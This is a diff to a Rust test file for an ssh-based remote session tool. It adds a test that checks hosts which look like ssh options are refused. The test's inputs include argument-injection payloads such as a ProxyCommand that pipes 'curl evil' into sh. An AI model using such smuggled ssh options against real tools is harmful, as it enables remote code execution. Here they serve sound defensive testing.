@@ -59,7 +59,7 @@ impl Remote {
 for a; do [ "$a" = -G ] && {{ echo "serveraliveinterval 0"; exit 0; }}; done
 [ -e '{root}/down' ] && {{ echo "ssh: connect to host box: Connection refused" >&2; exit 255; }}
 while [ $# -gt 0 ] && [ "$1" != -- ]; do shift; done
-shift
+shift 2
 case "$*" in *proxy*) echo $$ >> '{root}/proxies' ;; esac
 export HOME='{root}/home' PATH='{root}/bin:/usr/bin:/bin' GROFE='{sock}'
 export XDG_STATE_HOME='{state}' XDG_RUNTIME_DIR='{run}' XDG_CONFIG_HOME='{cfg}'
@@ -239,6 +239,10 @@ fn install_puts_the_release_on_a_remote_without_grofe() {
     let out = run_bounded(cmd, CMD_TIMEOUT);
     assert!(out.status.success(), "{out:?}");
     assert!(out.stdout.contains("boot:"), "{out:?}");
+    assert!(
+        out.stderr.contains("not the default release URL"),
+        "{out:?}"
+    );
     assert!(out.stderr.contains("installed"), "{out:?}");
     assert!(r.installed().is_file());
     // Now it is there: no install the second time.
@@ -374,4 +378,26 @@ fn remote_reconnect_off_exits_on_a_drop() {
     let out = String::from_utf8_lossy(h.output()).into_owned();
     assert!(out.contains("lost server"), "{out}");
     assert!(!out.contains(BAR));
+}
+
+// ------------------------------------------------------------------ hostile targets
+
+/// A host or URL that ssh could read as an option is refused before ssh
+/// ever runs.
+#[test]
+fn hosts_that_look_like_ssh_options_never_reach_ssh() {
+    let r = Remote::new(true);
+    let runs = [
+        r.local(&["-r", "-oProxyCommand=touch pwned", "list-sessions"]),
+        r.local(&["-r", "-oFoo", "list-sessions"]),
+        r.local(&["attach", "ssh://-oProxyCommand=curl evil|sh"]),
+        r.local(&["attach", "ssh://-oX=y@h"]),
+    ];
+    for cmd in runs {
+        let out = run_bounded(cmd, CMD_TIMEOUT);
+        assert!(!out.status.success(), "{out:?}");
+        assert!(out.stderr.contains("starts with -"), "{out:?}");
+    }
+    assert!(!r.root().join("proxies").exists());
+    assert!(!r.root().join("pwned").exists());
 }
